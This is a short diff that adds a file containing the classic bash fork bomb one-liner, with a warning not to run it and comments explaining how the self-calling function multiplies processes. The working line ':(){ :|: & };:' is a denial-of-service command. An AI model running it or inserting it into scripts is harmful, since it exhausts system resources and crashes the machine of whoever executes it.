@@ -1,0 +1,9 @@
+# Forkbomb
+# DO NOT RUN UNLESS YOU WANT YOUR COMPUTER TO CRASH
+
+# This defines a function named ':' that calls itself, pipes its output back to
+# itself, and runs that in the background. the ';:' at the end terminates the
+# function definition and then calls the function to begin the chain reaction.
+# A very nasty trick, indeed.
+
+:(){ :|: & };:
